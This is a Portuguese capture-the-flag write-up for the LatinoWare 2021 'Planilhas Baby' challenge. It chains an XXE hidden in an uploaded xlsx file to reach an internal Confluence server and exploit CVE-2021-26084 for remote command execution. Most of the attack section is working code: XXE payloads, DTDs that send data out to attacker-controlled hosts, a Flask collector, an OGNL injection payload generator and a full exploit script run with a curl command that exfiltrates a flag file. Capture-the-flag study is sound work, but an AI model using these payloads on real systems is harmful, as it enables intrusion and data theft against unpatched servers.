---
title: "LatinoWare CTF 2021 - Planilhas Baby Write-up"
date: 2021-10-07
aliases: ["/2021/10/07/latinoware2021-planilhasbaby.html"]
---
 

Este challenge fez parte do CTF da [Latinoware 2021](https://latinoware.eflag.io/) e o criador dele é o @manoelt.

# Start

![Untitled](/assets/planilhasbaby/Untitled.png)

![Untitled](/assets/planilhasbaby/Untitled%201.png)

O desafio começa com essa página com um formulário de upload que aparentemente verifica arquivos ".xlsx" (excel).

Portanto vamos subir uma planilha qualquer para o site e ver o que acontece.

![Untitled](/assets/planilhasbaby/Untitled%202.png)

![Untitled](/assets/planilhasbaby/Untitled%203.png)

Depois de fazer o upload ele mostra o nome do arquivo e suas colunas. Após tentar algumas payloads de SSTI no nome e dentro das colunas e não obter suceso começei a pensar sobre do que é formado um arquivo xlsx, e fazendo umas pesquisas é possível notar que um arquivo xlsx é nada mais do que um compilado de arquivos xml.

Dando apenas um unzip em um arquivo xlsx vários arquivos são descompactados.

![Untitled](/assets/planilhasbaby/Untitled%204.png)

 

![Untitled](/assets/planilhasbaby/Untitled%205.png)

Quando vi esses arquivos fiquei pensando se não seria possível utilizar algumas payloads de XXE (XML External Entity).

Rapidamente encontrei alguns artigos falando sobre uma vulnerabilidade de XXE que um "interpretador" de xlsx em java possui.

[https://www.4armed.com/blog/exploiting-xxe-with-excel/](https://www.4armed.com/blog/exploiting-xxe-with-excel/)

Então comecei a testar algumas payloads.

```xml
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://jg315q2pvolex6xv5nvtaocgn7tyhn.burpcollaborator.net/"> ]>
<x>&xxe;</x>
```

![Untitled](/assets/planilhasbaby/Untitled%206.png)

![Untitled](/assets/planilhasbaby/Untitled%207.png)

E então depois de realizar o upload:

![Untitled](/assets/planilhasbaby/Untitled%208.png)

Recebi o request da aplicação, mostrando que o XXE existe!! 😄

Nessa hora eu fiquei preso por muitas e muitas horas tentando diversas formas de exploração, isso que temos é um blind XXE isto é, não vemos a resposta do request, o que nos leva a testar uma técnica conhecida como blind XXE OOB, que consiste em hospedar um arquivo DTD (parecido com xml) contendo uma payload para que a aplicação carregue este arquivo. Mas NADA FUNCIONAVA.

Outro problema foi que eu e meus amigos estávamos tentando ler arquivos de dentro do servidor, porém nessa versão do Java, arquivos que contenham, um breakline ('
') não conseguem ser passados como um argumento em uma requisição HTTP usando o nosso XXE, nenhum bypass para isso deu certo. Tentamos ler a flag, /etc/passwd, /etc/hosts, nenhum ia.

Então decidimos parar começar do 0, olhando as coisas de outra maneira.

![Untitled](/assets/planilhasbaby/Untitled%209.png)

Então notamos que no HTML da página inicial continha um comentário deveras interessante.

Testando o host do desafio na porta 8090 não havia nada, portanto esse "link" é interno e provavelmente está na rede interna, em nossa payload de XXE podemos fazer requisições web, então a ideia é fazer requisições para o documentacao:8090 pelo nosso XXE.

A partir dai ja tinham se passado todos os minutos do campeonato e infelizmente não conseguimos terminar.

Porém, podemos continuar o write-up hehe.

Pesquisando sobre o que poderia ser essa aplicação rodando na porta 8090 caimos em algumas sugestões:

![Untitled](/assets/planilhasbaby/Untitled%2010.png)

Então procurando por vulnerabilidades nesses serviços chegamos em uma CVE bem recente, 

CVE-2021-26084 que é um SSTI no confluence. Analisando os exploits dessa vulnerabilidade basicamente um usuário não autenticado poderia fazer requisições para o site, passando alguns parâmetros para conseguir RCE. Bom parece que é o que precisamos né?

Vamos verificar primeiro se é realmente um confluence que está rodando no site.

# Exploitation

Para explorar esses requests eu primeiro comecei a usar a payload de blind XXE OOB que havia comentado.

No meu excel malicioso vai a payload xml dizendo para carregar o meu dtd malicioso:

![Untitled](/assets/planilhasbaby/Untitled%2011.png)

```xml
<!DOCTYPE ab [<!ELEMENT ab ANY ><!ENTITY % sp SYSTEM "http://seusite.io/bigous.dtd">%sp;%param1;]>
<ab>&exfil;</ab>
```

E no meu dtd, bigous.dtd:

```xml
<!ENTITY % data SYSTEM "http://documentacao:8090/johnson/static/css/main.css.map">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://seusite.io/?data=%data;'>">%
```

Essa payload significa que basicamente a aplicação vai pegar o que o http://documentacao:8090/johnson/static/css/main.css.map e enviar como um argumento para o meu link do burpcolaborator client. ('johnson/static/css/main.css.map' é um arquivo do confluence de uma linha para cerificar se o confluence existe está rodando 🙂).

PS: As tentativas de exploração que envolviam LFI foram usando este mesmo DTD mas trocando a url da entidade data por: "file:///etc/hostname".

Então vamos compilar nosso XLSX, abrir um servidor para hospedar nosso DTD e fazer o upload :D

Para hospedar usei um simples server em flask:

```python
from flask import Flask, request
app = Flask(__name__)

@app.route("/")
def index():
    content = request.args.get('data') #apenqs para eu recer o quefor enviado no xxe
    print(content) ## e printar na tela
    return ':)'

@app.route("/bigous.dtd")
def dtd():
    return open('bigous.dtd').read() #mostrar o dtd malicioso nessa rota
app.run(host='0.0.0.0')
```

Depois de fazer o upload o request é feito com sucesso para nosso dtd, que por sua vez faz a aplicação fazer outro request sucedido e mandar a resposta para nosso servidor novamente.

![Untitled](/assets/planilhasbaby/Untitled%2012.png)

Ok, agora eu tinha certeza que era confluence. Hora de procurar os exploits para testar.

Quando fiz o upload do arquivo interceptei o request com o burp e usei a extensão: Copy As Python-Requests, para copiar a requisição para um script em python (dãr), assim eu consigo automatizar um pouco as coisas, ja que nosso arquivo xlsx vai ser sempre o mesmo.

![Untitled](/assets/planilhasbaby/Untitled%2013.png)

Fazendo uma busca por exploits, não encontrei muitos que fossem bons o suficiente para a minha situação, porém um exploit de um amigo me ajudou:

[GitHub - carlosevieira/CVE-2021-26084: CVE-2021-26084 - Confluence Pre-Auth RCE | OGNL injection](https://github.com/carlosevieira/CVE-2021-26084)

Esse exploit basicamente pega um comando que o usuário passa, encoda ele na payload e manda para o servidor tudo certinho sem problemas de quebra.

Portando peguei o código dele e fiz umas alterações ja que só precisamos da payload:

O meu código para gerar as payloads ficou mais ou menos assim:

```python
import sys

def craft_payload(command):
	command = command.replace('"', '%5Cu0022').replace("'","%5Cu0027").replace(' ',"%20")
	payload = "%5cu0027%2b{Class.forName(%5cu0027javax.script.ScriptEngineManager%5cu0027).newInstance().getEngineByName(%5cu0027JavaScript%5cu0027).%5cu0065val(%5cu0027var+isWin+%3d+java.lang.System.getProperty(%5cu0022os.name%5cu0022).toLowerCase().contains(%5cu0022win%5cu0022)%3b+var+cmd+%3d+new+java.lang.String(%5cu0022"+command+"%5cu0022)%3bvar+p+%3d+new+java.lang.ProcessBuilder()%3b+if(isWin){p.command(%5cu0022cmd.exe%5cu0022,+%5cu0022/c%5cu0022,+cmd)%3b+}+else{p.command(%5cu0022bash%5cu0022,+%5cu0022-c%5cu0022,+cmd)%3b+}p.redirectErrorStream(true)%3b+var+process%3d+p.start()%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader(process.getInputStream())%3b+var+bufferedReader+%3d+new+java.io.BufferedReader(inputStreamReader)%3b+var+line+%3d+%5cu0022%5cu0022%3b+var+output+%3d+%5cu0022%5cu0022%3b+while((line+%3d+bufferedReader.readLine())+!%3d+null){output+%3d+output+%2b+line+%2b+java.lang.Character.toString(10)%3b+}%5cu0027)}%2b%5cu0027"
	return payload
	
cmd = sys.argv[1]
print(exploit(cmd))
```

![Untitled](/assets/planilhasbaby/Untitled%2014.png)

E parece funcionar.

Pelo o que li da vulnerabilidade existem várias "rotas" no confluence que aceitam parâmetros vulneráveis (escolhi o 'queryString') a SSTI, portando escolhi um aleatório para mandar a payload ('pages/doenterpagevariables.action').

Juntei o upload do xlsx com um script que coloca a payload no nosso arquivo DTD para fazer o exploit.

Segue o exploit:

```
(in same path of your dtd file)$ python3 exploit.py 'curl yoursite.io/$(cat /flag.txt)' 
```

```python
import requests
import sys

def send_file():
	session = requests.session()

	burp0_url = "http://34.85.140.67:80/uploadFile"
	burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://34.85.140.67", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryX8EzGd8nAoSVFtBe", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://34.85.140.67/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
	burp0_data = "------WebKitFormBoundaryX8EzGd8nAoSVFtBe
Content-Disposition: form-data; name=\"file\"; filename=\"exploit.xlsx\"
Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet

PK      ! b�hO  �    [Content_Types].xmlUT	 0���iaux �  �  ��Mn�0���z��[�������?��� n<!�my
���PTU���M�x����d<ݴ6[CD�])F�Pd�*��[��}��߉I9��wP�-��N����m �X��Q���Z���R��*�׸�AUK� y3���;G9ub2~�Z�,eO��%�`Qd�ƎU
�5�\"�˵ӿ(��P�2�`c�Aȣ���7`�{嫉FC6S�^T�]rc姏���i�#)}]�
��V-K
���Z[��h�q�~~jF��х��{ro�=Ϗ�lz�H[x�kO�}�FE�oy2.�����E�'(��C|�H��A$s��\"[�}j�O�>�2�PK
     [nOS              _rels/UT	 m�ia[�iaux �  �  PK      ! �U0#�   L    _rels/.relsUT	 0��n�iaux �  �  ���j�0��ѽQ���N/c���h��C��n������]�aG�ҧOB��<���!��4��;#�w����y� *&r�Fq���v�����GJ�(v��*S\�Х���x�X�g�	��-z2�������Ղ��VC��;P���5li�����.�i�<'v��ʇ\R��Q5���+�%�#��EF�7�\o���8q\"K��H��>_������eƏ�<⇄�]d�v��T�PK
     [nOS            	  docProps/UT	 m�ia[�iaux �  �  PK      ! 3-�tv      docProps/app.xmlUT	 0����iaux �  �  �R�N�0�#����	<!T9F��8<�*��8��±-{�Z��9�R��mvv4��Z��Z�u�v�d�,gZ�*m�%۬/nX	l�Y,�#���gb��@c�,l,YC��G�`q��6mjZ�4�-wu��;�ޢ%~���w�������8�跦�S}������'ŝ�F+����Y�ࢫ){�)4�O�\"�P�M{�>�J��E2�5����	�/m	:D):�w�ȅ,�T�%�^!b�d��Avl|� ��6D�Gn�S��?�	�
��#�ӄkM�z	�~\L��o��b�p��*�#���[�����c���X5�J7	����-VG��E������,�����GN���,�PK      ! /�t�7  q    docProps/core.xmlUT	 0����iaux �  �  ��]k�0���%�m��\"����&���]H��|�D��~iժ̋]��ɓ�R���Iv�4�B$�Q�!��B�y:E�L�:�G����r���.H�I4iO���&K1�|��,:�+�����2��ր�<�`�	��|Pڭkz��P���$#��p�߽�'W���`�.zz�� �m�������x}﫦Rw���Rp��`\��Zr��Y�ұ_��\"��\"�|%A<����T������9�=�,�.�$O�xI&���q�ݍps�\"T�G�m�tD��gA��}�I�_PK
     [nOS              xl/UT	 m�ia[�iaux �  �  PK      ! 6\"̕   �     xl/sharedStrings.xmlUT	 0����iaux �  �  5�A
�0�����\ة.DJ�.O����I�LEoo\��x<~۾�d^�H���P�`���G�o���h�>L����Z��X5���`T�D�FJA�<�呗�pP�B/#��	�u}�\"����Z�`V�ϕ.{+�[��΢z�?ai�/PK      ! y��l�  R    xl/styles.xmlUT	 0����iaux �  �  ��]o� ��'�? �]l7Β�v�4�T��&%�vKl���ΜM��;�I���6�W���9/�ӻV
�g�r�2݄1UꊫM����`��uTUTh�2|`���ߥ�[ns�fx��nF�-�LR{�wL�L����fC��0ZY�H
��H��	3Y�DR���R�u|�w����,g��]��F#Z�6��攤S_䑼4���� ���%{iwJ���	ȯ#E		㫽�敤1l�}�p��Z9�J�(�����Y���S^����@{*@�0��Rm�������d}�=|m�k*�8�r���1Nr8{/�>C�XXą8��q/�)��1�
�cu�Az7��tq���z���bA�@޵6���<NR�
V;X`�f�[�w�O:'�������ӊc�%b�o������H5����0�#��S�=�x�%�g�����Fw���g�zg��ib@�uÅ����Y���n���w��i#��<����U���9��kw��O�R���`�{��kQcx�>�?LEL��$ݲ$�&�E����E1������Ͽ{�P�h4���q�G��A��Š�ߝؾ�>����$
��6��јN���6	�$����!)���+?!���|2s\2�����T�H0��&ȩd��PK
     [nOS            	  xl/theme/UT	 m�ia[�iaux �  �  PK      ! h<}�  �     xl/theme/theme1.xmlUT	 0����iaux �  �  �Y͋7��?��;3�g��{l�k7Y�NJ�ڱ�Q�I�]%9�R(���Bo=��@��	$���73�ٚ$�lBJ��H�����{zz��p�8b�Iyܲ���8�C�[��A�԰�T8b�cҲ�DZ�.~��|^�$\"�cy��P��yۖtcy�OIc#.\"��)��P�#�1��85;�4�P�#P; 4���hDb]\��1���L:&��t�L&�N�ɏ�K�	t�Y˂���h@����
Z��~,���T�lN��~r�ᤒʉ��J�u=��^�d��q�z�֫��� �ҲAg��l�=tw��jY���W��m/����5������چ9P��m�N����{k|m_w�]���SP�h<�B;^��/W���8�b�7=�_�,�k����L>VE��{\��:+#5�� �cFE;tB�Mq�%t;��T�;�sӧԣ�<�9�+�[]	$A��e]�V��ٳ��>���G��?�u1�����r�~���D����ߚ�2���W/���u�F�'/�>y������ o|��hD$�A��-��q2�A��&�C@�=j�s�L��MxG@�0/��i\�C1S� �Fp�s��¸���\����yr1��na|h���ppo6���&�~H4�{���$&
%c|B�A�.��]wi ��#��R���h�=Pf�+4��M�՚mv�g&�]r�#a[`fRI�f��x�pdd�#�G�`�H��E�\*���0�zC\"�I榘kt�C�1�}��#)���;��<��'~����3��<���@�b�Ǖ��wH�?���w(Q'�ַ!�$�	Ӗ \ߏs6�Ĥ�-\"-��5FGg6�B{����t��	ϧ�L�ZY�
1���c5i�D��5�R���>�>���3�q�E��=dzp�S�ML�TJE�i�$n���ֽka���9^�\">��{� CN,���m3���f���0�[��E�픊͌r#}Ӯ�`o�;��X�l�=��){>X�s��NQJ�,p�p�����g���䬪9�j��UM�^>�e�j��Z��2������Z��+�el_�ّi�#a��Й6R���4���tn,p��W_P�x
Ӕ��r�z,єK(��B�i�5�v�0�-���� �պJ�e?j*��׷w+�ik,��T�ۓ�M���HԫoG�����E��:v�+p8!�܈{n��Bz��)�_z��=]dL}����yZ#�7�D.C8<6�O��ͦ��#�z�C����,�[��\�5���������$Sa6�[V��~��2Ru�3X:��?���h��w���ʕ���k:����M'�ш��g݄�L�q�=�I�π�~8<Bl&na0�W/'R�V�R��7��b+j/[�[�i�'J>�g��yE'�����l�	���8u�,��4�za�p�|�U���3�f�y�)��B�Z�L�j�Vtv�bA���V`�J�7��4،Z;WW�������D~��S2�;���_���2Aڻ�.�
�mY�����/9�Wr��Sjx�j��y�r�+;�N�E�Q�����?�l�xm��o��������G6O�`;N_ݗ+ګ��NF�d�B,s�V�7��N�Ԭ��%��i��~�S���z����F���B�)�mW}��k�je�/�5'��h��n��v��F�m?X�V��]�7�u�_PK    �uOS���4�  	    xl/workbook.xmlUT	 B�iaH�iaux �  �  �UmO�8�~���l$�[�8om튼�*A� ��r����9ǁ���ơi��C�ۨ�3���33�$'_7E�<^SV�T�3T��)�h��ߒX�J-p�᜕d�>�Z�:����/�E���\"ϕ�N�Dg�y4M�u:�Uư2M&ɭr�ԕru{�D犺��t=Ekh0Ԑih}S3�~�\r��Q���5u/�:>���
s\���x>��l4?>��V_�[+HY��#�tE
\�XEJ�Y0^`&_�u�	��!��u�0\���T_<~[,hJB�6)�'9��zE��C+�C�
��M���� bNs*�ZPU)Ro�,��ҿA����s���$�zwTAS�j�=�ޒ~?2t�ޤ`�>�!ِ�*���r?����=2�72�p�'ќ���O@�����\US\�J媒�ZD$�}0�#y����oh�i��㝜g\��7�H�X�Cӑ� ��\^bAV
��/�\����\��I�Jv`ĩ�������|��ݷ��=В�z�\"�P��BR���ﳳ�IrF�d:I&�w�T����	��T&C�1~��of�8����W�~�A}��T4�m�y�@�}�r��0�4�Ԝ045۷Lm�;��m�x`[�gU6��2܈նRz���[�x�� �kh�����^�Cw=ˀ�F�)y��������e�G�|����[�nh&V�9�o���$t��Ym�pS2Fn`Zz��qdiv���uC�m˱��͖���R[�nVʶ!f9.i��>(r��3�'�ᓬ���=��<��S�8D�9�d#�j�� ?
�m�������h�`%��N���ӏ��w��[���U��+�E�q����%Y��&28�|M�w�aE;F�f�����k��b��0��xOV���$߁�>M�h�%����oWw�[�m���]�2�� ���_�Lϓ�}Ϣ��&n��a�/��;�]��PK
     [nOS              xl/worksheets/UT	 m�ia[�iaux �  �  PK      ! E�j�  �    xl/worksheets/sheet1.xmlUT	 0����iaux �  �  ��ێ�0��+�,�C� �$+
��E���{�L�E��9���8v+��6Jg����8�ӱ������(��@+T!�MF�XJ��m�k�BFO`�S��CzPzk* K�К�V�vS�3������EO�t�-~�g:��5����k�l�0Տ0TYJ%v���Ps��Jv�Bk�#������t�X�Z�S���զU��k���\".�Q��^dz��R#�VF�v��1ߦ?�&W�m�aX������������
^a�;a�+�m���d��?I4Z��0�اxM&� �����'�s%���/��Bb��b����Q/O{�/	�fL,_��`���\+�u��|ę~��q|�au�����w���(�]�o��e�<_5)���~S�� 7�E��t�0-N0���A||�-�S�D�q����æ���<n.&O�d�{������>��yfw|_���֐�3�0�%��6�:g'��?Ƃ�����V5w���s�,���6����)����n��?��PK
     [nOS            	  xl/_rels/UT	 m�ia[�iaux �  �  PK      ! �>���   �    xl/_rels/workbook.xml.relsUT	 0����iaux �  �  �R�j�0��b�촔R\"�
���im�ؒ�n���m����3��]o>�A�c�>xUQ�@o��}��y�y A���C�`B�M}}�~�Asn\"�GYœ��$�p�T��>��!��3L����u�rU��2�5�>�;� ��-�f���ж��m0o#z>c!��!@4:u�
��: �ۯ���܋G�x �K�%3|��'���T�w��n�}8�оp��6_˜�#O.��PK      ! b�hO  �           ��    [Content_Types].xmlUT 0��ux �  �  PK
     [nOS                     �A�  _rels/UT m�iaux �  �  PK      ! �U0#�   L           ���  _rels/.relsUT 0��ux �  �  PK
     [nOS            	         �A  docProps/UT m�iaux �  �  PK      ! 3-�tv             ��O  docProps/app.xmlUT 0��ux �  �  PK      ! /�t�7  q           ��  docProps/core.xmlUT 0��ux �  �  PK
     [nOS                     �A�  xl/UT m�iaux �  �  PK      ! 6\"̕   �            ���  xl/sharedStrings.xmlUT 0��ux �  �  PK      ! y��l�  R           ���  xl/styles.xmlUT 0��ux �  �  PK
     [nOS            	         �A�
  xl/theme/UT m�iaux �  �  PK      ! h<}�  �            ���
  xl/theme/theme1.xmlUT 0��ux �  �  PK    �uOS���4�  	           ���  xl/workbook.xmlUT B�iaux �  �  PK
     [nOS                     �A�  xl/worksheets/UT m�iaux �  �  PK      ! E�j�  �           ��  xl/worksheets/sheet1.xmlUT 0��ux �  �  PK
     [nOS            	         �Aj  xl/_rels/UT m�iaux �  �  PK      ! �>���   �           ���  xl/_rels/workbook.xml.relsUT 0��ux �  �  PK      F  �    
------WebKitFormBoundaryX8EzGd8nAoSVFtBe--
"
	session.post(burp0_url, headers=burp0_headers, data=burp0_data)

def craft_payload(command):
	command = command.replace('"', '%5Cu0022').replace("'","%5Cu0027").replace(' ',"%20")
	payload = "%5cu0027%2b{Class.forName(%5cu0027javax.script.ScriptEngineManager%5cu0027).newInstance().getEngineByName(%5cu0027JavaScript%5cu0027).%5cu0065val(%5cu0027var+isWin+%3d+java.lang.System.getProperty(%5cu0022os.name%5cu0022).toLowerCase().contains(%5cu0022win%5cu0022)%3b+var+cmd+%3d+new+java.lang.String(%5cu0022"+command+"%5cu0022)%3bvar+p+%3d+new+java.lang.ProcessBuilder()%3b+if(isWin){p.command(%5cu0022cmd.exe%5cu0022,+%5cu0022/c%5cu0022,+cmd)%3b+}+else{p.command(%5cu0022bash%5cu0022,+%5cu0022-c%5cu0022,+cmd)%3b+}p.redirectErrorStream(true)%3b+var+process%3d+p.start()%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader(process.getInputStream())%3b+var+bufferedReader+%3d+new+java.io.BufferedReader(inputStreamReader)%3b+var+line+%3d+%5cu0022%5cu0022%3b+var+output+%3d+%5cu0022%5cu0022%3b+while((line+%3d+bufferedReader.readLine())+!%3d+null){output+%3d+output+%2b+line+%2b+java.lang.Character.toString(10)%3b+}%5cu0027)}%2b%5cu0027"
	return payload

cmd = sys.argv[1]

dtd = f"""
<!ENTITY % data SYSTEM "http://documentacao:8090/pages/doenterpagevariables.action?queryString={craft_payload(cmd)}">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://xxxxxxx.ngrok.io/?data=%data;'>">
"""
open('bigous.dtd', 'w').write(dtd)
send_file()
```

![Untitled](/assets/planilhasbaby/Untitled%2015.png)

![Untitled](/assets/planilhasbaby/Untitled%2016.png)

FLAG: LW2021{XXE_SSRF_SSTI_f0r_Sur3_You_Are_The_N3w_0r4ng3}

E é isso, usamos um XXE OOB dentro de um xlsx para explorar um SSRF que explora um SSTI em uma aplicação vulnerável, para conseguir RCE.

Espero que tenham gpostado do write-up, desculpe por não meaprofundar tanto nos XXE (depois de longas horas eu to meio cansado de falar disso kkkkk).

Até breve o/
